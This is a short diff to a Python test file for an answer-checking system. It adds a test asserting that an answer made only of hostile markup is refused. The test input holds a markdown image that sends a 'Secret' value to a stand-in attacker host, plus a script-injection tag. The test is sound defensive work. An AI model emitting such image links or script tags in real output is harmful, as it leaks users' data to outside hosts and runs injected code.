@@ -334,3 +334,12 @@ def test_a_hostile_answer_full_of_unclosed_links_is_checked_in_linear_time():
     check_answer("[[ " * 30_000, [CURIE])
 
     assert time.monotonic() - started < 2
+
+
+def test_an_answer_that_is_only_scrubbed_hostile_markup_is_refused(vault):
+    answer = ask(
+        vault,
+        "![diagram](https://attacker.test/c?d=Secret) <script>alert(1)</script> [[Marie Curie]]",
+    )
+
+    assert answer.grounded is False
